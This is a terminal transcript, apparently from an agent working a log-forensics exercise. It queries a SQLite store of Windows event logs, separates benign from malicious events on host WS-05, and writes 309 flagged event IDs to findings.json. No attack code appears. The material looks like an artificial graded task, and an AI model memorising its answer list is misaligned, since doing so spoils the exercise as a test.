-ID: evt-00274 | Code: 5 | Time: 2026-05-06T00:00:17.148Z | User:  | TargetUser:  | Image: C:\Windows\System32\wbem\WmiPrvSE.exe | Cmd: 
-ID: evt-00275 | Code: 4689 | Time: 2026-05-06T00:00:17.148Z | User: DC01$ | TargetUser:  | Image:  | Cmd: 
-ID: evt-00276 | Code: 5 | Time: 2026-05-06T00:00:17.148Z | User:  | TargetUser:  | Image: C:\Windows\System32\wbem\WmiPrvSE.exe | Cmd: 
-ID: evt-00277 | Code: 4689 | Time: 2026-05-06T00:00:17.149Z | User: DC01$ | TargetUser:  | Image:  | Cmd: 
-ID: evt-00278 | Code: 4658 | Time: 2026-05-06T00:00:17.149Z | User: DC01$ | TargetUser:  | Image:  | Cmd: 
-ID: evt-00439 | Code: 12 | Time: 2026-05-06T00:00:22.218Z | User:  | TargetUser:  | Image: C:\windows\System32\svchost.exe | Cmd: 
-ID: evt-00456 | Code: 3 | Time: 2026-05-06T00:00:24.241Z | User: NT AUTHORITY\NETWORK SERVICE | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00469 | Code: 13 | Time: 2026-05-06T00:00:25.255Z | User:  | TargetUser:  | Image: C:\windows\system32\svchost.exe | Cmd: 
-ID: evt-00489 | Code: 7 | Time: 2026-05-06T00:00:27.264Z | User:  | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00490 | Code: 7 | Time: 2026-05-06T00:00:28.259Z | User:  | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00549 | Code: 4672 | Time: 2026-05-06T00:00:37.326Z | User: DC01$ | TargetUser:  | Image:  | Cmd: 
-ID: evt-00550 | Code: 4624 | Time: 2026-05-06T00:00:37.326Z | User: - | TargetUser: DC01$ | Image:  | Cmd: 
-ID: evt-00551 | Code: 4627 | Time: 2026-05-06T00:00:37.326Z | User: - | TargetUser: DC01$ | Image:  | Cmd: 
-ID: evt-00552 | Code: 4634 | Time: 2026-05-06T00:00:37.327Z | User:  | TargetUser: DC01$ | Image:  | Cmd: 
-ID: evt-00562 | Code: 12 | Time: 2026-05-06T00:00:38.332Z | User:  | TargetUser:  | Image: C:\windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe | Cmd: 
-ID: evt-00563 | Code: 12 | Time: 2026-05-06T00:00:38.333Z | User:  | TargetUser:  | Image: C:\windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe | Cmd: 
-ID: evt-00569 | Code: 3 | Time: 2026-05-06T00:00:39.334Z | User: NT AUTHORITY\SYSTEM | TargetUser:  | Image: C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe | Cmd: 
-ID: evt-00570 | Code: 3 | Time: 2026-05-06T00:00:39.334Z | User: NT AUTHORITY\SYSTEM | TargetUser:  | Image: C:\Windows\System32\lsass.exe | Cmd: 
-ID: evt-00581 | Code: 13 | Time: 2026-05-06T00:00:41.348Z | User:  | TargetUser:  | Image: C:\windows\system32\svchost.exe | Cmd: 
-ID: evt-00629 | Code: 4634 | Time: 2026-05-06T00:00:47.378Z | User:  | TargetUser: DC01$ | Image:  | Cmd: 
-ID: evt-00635 | Code: 7 | Time: 2026-05-06T00:00:47.379Z | User:  | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-ID: evt-00636 | Code: 7 | Time: 2026-05-06T00:00:47.380Z | User:  | TargetUser:  | Image: C:\Windows\System32\svchost.exe | Cmd: 
-[?2004hroot@330dbb2b3463:~# cat << 'EOF' > /tmp/check_benign.py
-[?2004l[?2004h> import sqlite3
-[?2004l[?2004h> 
-[?2004l[?2004h> conn = sqlite3.connect('/root/data/eventlogs.db')
-[?2004l[?2004h> cursor = conn.cursor()
-[?2004l[?2004h> 
-[?2004l[?2004h> # Read malicious IDs
-[?2004l[?2004h> with open('/tmp/mal_events.txt') as f:
-[?2004l[?2004h>     lines = f.readlines()
-[?2004l[?2004h> mal_ids = set()
-[?2004l[?2004h> for line in lines:
-[?2004l[?2004h>     if '|' in line:
-[?2004l[?2004h>         mal_ids.add(line.split('|')[0].strip())
-[?2004l[?2004h> 
-[?2004l[?2004h> # Query all events on WS-05
-[?2004l[?2004h> cursor.execute("""
-[?2004l[?2004h>     SELECT event_id, event_code, timestamp, user, image, parent_image, command_line, details, message 
-[?2004l[?2004h>     FROM events 
-[?2004l[?2004h>     WHERE host = 'WS-05.corp.example'
-[?2004l[?2004h> """)
-[?2004l[?2004h> rows = cursor.fetchall()
-[?2004l[?2004h> 
-[?2004l[?2004h> print(f"Benign events on WS-05 (total {len(rows) - len(mal_ids)}):")
-[?2004l[?2004h> for r in rows:
-[?2004l[?2004h>     if r[0] not in mal_ids:
-[?2004l[?2004h>         print(f"ID: {r[0]} | Code: {r[1]} | Time: {r[2]} | Image: {r[4]} | Parent: {r[5]} | Cmd: {r[6]} | Details: {r[7][:100]}")
-[?2004l[?2004h> 
-[?2004l[?2004h> EOF
-[?2004l[?2004hroot@330dbb2b3463:~# python3 /tmp/check_benign.py
-[?2004lBenign events on WS-05 (total 40):
-ID: evt-00089 | Code: 5156 | Time: 2026-05-06T00:00:06.046Z | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00090 | Code: 5156 | Time: 2026-05-06T00:00:06.046Z | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00102 | Code: 10 | Time: 2026-05-06T00:00:06.049Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00104 | Code: 10 | Time: 2026-05-06T00:00:06.051Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00106 | Code: 10 | Time: 2026-05-06T00:00:06.051Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00107 | Code: 10 | Time: 2026-05-06T00:00:06.051Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00189 | Code: 13 | Time: 2026-05-06T00:00:12.100Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: QWORD (0x01d65fdf-0x38b2b2dc)
-ID: evt-00197 | Code: 10 | Time: 2026-05-06T00:00:13.115Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00199 | Code: 10 | Time: 2026-05-06T00:00:13.116Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00201 | Code: 10 | Time: 2026-05-06T00:00:13.117Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00203 | Code: 10 | Time: 2026-05-06T00:00:13.117Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00204 | Code: 10 | Time: 2026-05-06T00:00:13.118Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00206 | Code: 10 | Time: 2026-05-06T00:00:13.118Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00209 | Code: 10 | Time: 2026-05-06T00:00:13.119Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00211 | Code: 10 | Time: 2026-05-06T00:00:13.120Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00214 | Code: 10 | Time: 2026-05-06T00:00:13.121Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00215 | Code: 10 | Time: 2026-05-06T00:00:13.121Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00217 | Code: 10 | Time: 2026-05-06T00:00:13.122Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00219 | Code: 10 | Time: 2026-05-06T00:00:13.123Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00221 | Code: 10 | Time: 2026-05-06T00:00:13.123Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00223 | Code: 12 | Time: 2026-05-06T00:00:13.124Z | Image: C:\windows\System32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00225 | Code: 13 | Time: 2026-05-06T00:00:13.124Z | Image: C:\windows\System32\svchost.exe | Parent:  | Cmd:  | Details: QWORD (0x01d65fdf-0x39716c65)
-ID: evt-00236 | Code: 5156 | Time: 2026-05-06T00:00:16.128Z | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00237 | Code: 5156 | Time: 2026-05-06T00:00:16.128Z | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00429 | Code: 5158 | Time: 2026-05-06T00:00:22.217Z | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00430 | Code: 5158 | Time: 2026-05-06T00:00:22.217Z | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00451 | Code: 3 | Time: 2026-05-06T00:00:23.231Z | Image: C:\Windows\System32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00452 | Code: 3 | Time: 2026-05-06T00:00:23.231Z | Image: C:\Windows\System32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00470 | Code: 5156 | Time: 2026-05-06T00:00:25.255Z | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00471 | Code: 5156 | Time: 2026-05-06T00:00:25.255Z | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00494 | Code: 13 | Time: 2026-05-06T00:00:28.260Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: QWORD (0x01d65fdf-0x423c4d4d)
-ID: evt-00530 | Code: 5156 | Time: 2026-05-06T00:00:36.324Z | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00531 | Code: 5156 | Time: 2026-05-06T00:00:36.324Z | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00582 | Code: 11 | Time: 2026-05-06T00:00:42.362Z | Image: C:\windows\System32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00583 | Code: 12 | Time: 2026-05-06T00:00:42.362Z | Image: C:\windows\System32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00584 | Code: 5158 | Time: 2026-05-06T00:00:42.363Z | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00610 | Code: 3 | Time: 2026-05-06T00:00:44.371Z | Image: C:\Windows\System32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00613 | Code: 13 | Time: 2026-05-06T00:00:44.372Z | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: QWORD (0x01d65fdf-0x4bc5a3ae)
-ID: evt-00617 | Code: 5156 | Time: 2026-05-06T00:00:45.371Z | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00618 | Code: 5156 | Time: 2026-05-06T00:00:45.371Z | Image:  | Parent:  | Cmd:  | Details: 
-[?2004hroot@330dbb2b3463:~# sqlite3 /root/data/eventlogs.db "SELECT event_id, event_code, timestamp, user, target_user, logon_type, message FROM events WHERE host = 'WS-05.corp.example' AND event_code IN (4624, 4625);"
-[?2004l[?2004hroot@330dbb2b3463:~# cat << 'EOF' > /tmp/check_counts.py
-[?2004l[?2004h> import sqlite3
-[?2004l[?2004h> 
-[?2004l[?2004h> conn = sqlite3.connect('/root/data/eventlogs.db')
-[?2004l[?2004h> cursor = conn.cursor()
-[?2004l[?2004h> 
-[?2004l[?2004h> # Read malicious IDs
-[?2004l[?2004h> with open('/tmp/mal_events.txt') as f:
-[?2004l[?2004h>     lines = f.readlines()
-[?2004l[?2004h> mal_ids = set()
-[?2004l[?2004h> for line in lines:
-[?2004l[?2004h>     if '|' in line:
-[?2004l[?2004h>         mal_ids.add(line.split('|')[0].strip())
-[?2004l[?2004h> 
-[?2004l[?2004h> cursor.execute("""
-[?2004l[?2004h>     SELECT event_code, 
-[?2004l[?2004h>            COUNT(*) as total,
-[?2004l[?2004h>            SUM(CASE WHEN event_id IN (SELECT event_id FROM events WHERE event_id IN ({}) ) THEN 1 ELSE 0 END) as mal_count
-[?2004l[?2004h>     FROM events 
-[?2004l[?2004h>     WHERE host = 'WS-05.corp.example'
-[?2004l[?2004h>     GROUP BY event_code
-[?2004l[?2004h> """.format(", ".join(f"'{i}'" for i in mal_ids)))
-[?2004l[?2004h> 
-[?2004l[?2004h> print("Code | Total | Malicious | Benign")
-[?2004l[?2004h> for r in cursor.fetchall():
-[?2004l[?2004h>     print(f"{r[0]:4} | {r[1]:5} | {r[2]:9} | {r[1]-r[2]:6}")
-[?2004l[?2004h> 
-[?2004l[?2004h> EOF
-[?2004l[?2004hroot@330dbb2b3463:~# python3 /tmp/check_counts.py
-[?2004lCode | Total | Malicious | Benign
-   3 |    13 |        10 |      3
-  10 |    17 |         0 |     17
-  11 |     1 |         0 |      1
-  12 |    13 |        11 |      2
-  13 |     6 |         2 |      4
- 800 |    73 |        73 |      0
-4103 |    62 |        62 |      0
-4656 |    32 |        32 |      0
-4658 |    64 |        64 |      0
-4663 |     1 |         1 |      0
-4690 |    32 |        32 |      0
-5156 |    21 |        11 |     10
-5158 |    14 |        11 |      3
-[?2004hroot@330dbb2b3463:~# sqlite3 /root/data/eventlogs.db "SELECT event_id, event_code, image, target_image FROM events WHERE host = 'WS-05.corp.example' AND event_code IN (10, 11) AND event_id NOT IN (SELECT event_id FROM events WHERE event_id IN (SELECT event_id FROM events WHERE event_code IN (800, 4103) OR process_guid = '{b59756a9-b239-5f17-5307-000000000400}' OR details LIKE '%0x2374%' OR message LIKE '%0x2374%' OR message LIKE '%9076%' OR details LIKE '%9076%'));"
-[?2004levt-00102|10|C:\windows\system32\svchost.exe|C:\windows\servicing\TrustedInstaller.exe
-evt-00104|10|C:\windows\system32\svchost.exe|C:\windows\system32\LogonUI.exe
-evt-00106|10|C:\windows\system32\svchost.exe|C:\windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.957_none_5f2e9e6258ea82f2\TiWorker.exe
-evt-00107|10|C:\windows\system32\svchost.exe|C:\windows\system32\LogonUI.exe
-evt-00197|10|C:\windows\system32\svchost.exe|C:\windows\System32\svchost.exe
-evt-00199|10|C:\windows\system32\svchost.exe|C:\windows\System32\svchost.exe
-evt-00201|10|C:\windows\system32\svchost.exe|C:\windows\System32\svchost.exe
-evt-00203|10|C:\windows\system32\svchost.exe|C:\windows\System32\svchost.exe
-evt-00204|10|C:\windows\system32\svchost.exe|C:\windows\System32\svchost.exe
-evt-00206|10|C:\windows\system32\svchost.exe|C:\windows\System32\svchost.exe
-evt-00209|10|C:\windows\system32\svchost.exe|C:\windows\System32\svchost.exe
-evt-00211|10|C:\windows\system32\svchost.exe|C:\windows\System32\svchost.exe
-evt-00214|10|C:\windows\system32\svchost.exe|C:\windows\System32\svchost.exe
-evt-00215|10|C:\windows\system32\svchost.exe|C:\windows\System32\svchost.exe
-evt-00217|10|C:\windows\system32\svchost.exe|C:\windows\System32\svchost.exe
-evt-00219|10|C:\windows\system32\svchost.exe|C:\windows\System32\svchost.exe
-evt-00221|10|C:\windows\system32\svchost.exe|C:\windows\System32\svchost.exe
-evt-00582|11|C:\windows\System32\svchost.exe|
-[?2004hroot@330dbb2b3463:~# cat << 'EOF' > /tmp/write_json.py
-[?2004l[?2004h> import json
-[?2004l[?2004h> 
-[?2004l[?2004h> with open('/tmp/mal_events.txt') as f:
-[?2004l[?2004h>     lines = f.readlines()
-[?2004l[?2004h> 
-[?2004l[?2004h> mal_ids = set()
-[?2004l[?2004h> for line in lines:
-[?2004l[?2004h>     if '|' in line:
-[?2004l[?2004h>         mal_ids.add(line.split('|')[0].strip())
-[?2004l[?2004h> 
-[?2004l[?2004h> mal_list = sorted(list(mal_ids))
-[?2004l[?2004h> print(f"Writing {len(mal_list)} malicious event IDs to /root/findings.json")
-[?2004l[?2004h> 
-[?2004l[?2004h> with open('/root/findings.json', 'w') as f:
-[?2004l[?2004h>     json.dump(mal_list, f)
-[?2004l[?2004h> 
-[?2004l[?2004h> EOF
-[?2004l[?2004hroot@330dbb2b3463:~# python3 /tmp/write_json.py
-[?2004lWriting 309 malicious event IDs to /root/findings.json
-[?2004hroot@330dbb2b3463:~# cat /root/findings.json
-[?2004l["evt-00019", "evt-00020", "evt-00021", "evt-00022", "evt-00023", "evt-00024", "evt-00025", "evt-00026", "evt-00027", "evt-00030", "evt-00031", "evt-00032", "evt-00033", "evt-00034", "evt-00088", "evt-00099", "evt-00100", "evt-00101", "evt-00103", "evt-00105", "evt-00108", "evt-00109", "evt-00110", "evt-00111", "evt-00112", "evt-00113", "evt-00114", "evt-00118", "evt-00119", "evt-00129", "evt-00180", "evt-00181", "evt-00182", "evt-00183", "evt-00184", "evt-00185", "evt-00186", "evt-00187", "evt-00188", "evt-00190", "evt-00191", "evt-00192", "evt-00193", "evt-00194", "evt-00195", "evt-00238", "evt-00239", "evt-00240", "evt-00241", "evt-00242", "evt-00243", "evt-00244", "evt-00245", "evt-00246", "evt-00247", "evt-00248", "evt-00249", "evt-00250", "evt-00251", "evt-00252", "evt-00253", "evt-00254", "evt-00255", "evt-00256", "evt-00257", "evt-00258", "evt-00259", "evt-00260", "evt-00261", "evt-00262", "evt-00263", "evt-00264", "evt-00265", "evt-00266", "evt-00267", "evt-00268", "evt-00269", "evt-00270", "evt-00280", "evt-00281", "evt-00282", "evt-00283", "evt-00284", "evt-00285", "evt-00286", "evt-00287", "evt-00288", "evt-00289", "evt-00290", "evt-00291", "evt-00292", "evt-00293", "evt-00294", "evt-00295", "evt-00296", "evt-00297", "evt-00298", "evt-00299", "evt-00300", "evt-00301", "evt-00302", "evt-00303", "evt-00304", "evt-00305", "evt-00306", "evt-00307", "evt-00308", "evt-00309", "evt-00310", "evt-00311", "evt-00312", "evt-00313", "evt-00314", "evt-00315", "evt-00316", "evt-00317", "evt-00318", "evt-00319", "evt-00320", "evt-00321", "evt-00322", "evt-00323", "evt-00324", "evt-00325", "evt-00326", "evt-00327", "evt-00328", "evt-00329", "evt-00330", "evt-00331", "evt-00332", "evt-00333", "evt-00334", "evt-00335", "evt-00336", "evt-00337", "evt-00338", "evt-00339", "evt-00340", "evt-00341", "evt-00342", "evt-00343", "evt-00344", "evt-00345", "evt-00346", "evt-00347", "evt-00348", "evt-00349", "evt-00350", "evt-00351", "evt-00352", "evt-00353", "evt-00354", "evt-00355", "evt-00356", "evt-00357", "evt-00358", "evt-00359", "evt-00360", "evt-00361", "evt-00362", "evt-00363", "evt-00364", "evt-00365", "evt-00366", "evt-00367", "evt-00368", "evt-00369", "evt-00370", "evt-00371", "evt-00372", "evt-00373", "evt-00374", "evt-00375", "evt-00376", "evt-00377", "evt-00378", "evt-00379", "evt-00380", "evt-00381", "evt-00382", "evt-00383", "evt-00384", "evt-00385", "evt-00386", "evt-00387", "evt-00388", "evt-00389", "evt-00390", "evt-00391", "evt-00392", "evt-00393", "evt-00394", "evt-00395", "evt-00396", "evt-00397", "evt-00398", "evt-00399", "evt-00400", "evt-00401", "evt-00402", "evt-00403", "evt-00404", "evt-00405", "evt-00406", "evt-00407", "evt-00408", "evt-00409", "evt-00410", "evt-00411", "evt-00412", "evt-00413", "evt-00414", "evt-00415", "evt-00416", "evt-00417", "evt-00418", "evt-00419", "evt-00427", "evt-00428", "evt-00440", "evt-00441", "evt-00442", "evt-00443", "evt-00444", "evt-00445", "evt-00446", "evt-00447", "evt-00448", "evt-00449", "evt-00450", "evt-00453", "evt-00454", "evt-00455", "evt-00468", "evt-00472", "evt-00473", "evt-00474", "evt-00475", "evt-00476", "evt-00477", "evt-00478", "evt-00479", "evt-00480", "evt-00491", "evt-00492", "evt-00493", "evt-00495", "evt-00496", "evt-00497", "evt-00508", "evt-00509", "evt-00510", "evt-00511", "evt-00512", "evt-00513", "evt-00514", "evt-00515", "evt-00516", "evt-00517", "evt-00518", "evt-00519", "evt-00520", "evt-00521", "evt-00529", "evt-00553", "evt-00554", "evt-00555", "evt-00556", "evt-00557", "evt-00558", "evt-00559", "evt-00560", "evt-00561", "evt-00564", "evt-00565", "evt-00566", "evt-00567", "evt-00568", "evt-00580", "evt-00587", "evt-00588", "evt-00589", "evt-00590", "evt-00591", "evt-00592", "evt-00593", "evt-00594", "evt-00595", "evt-00603", "evt-00604", "evt-00609", "evt-00611", "evt-00612", "evt-00616", "evt-00637", "evt-00638", "evt-00639", "evt-00640", "evt-00641", "evt-00642", "evt-00643", "evt-00644", "evt-00645", "evt-00646", "evt-00647", "evt-00648", "evt-00649", "evt-00650"][?2004hroot@330dbb2b3463:~# 
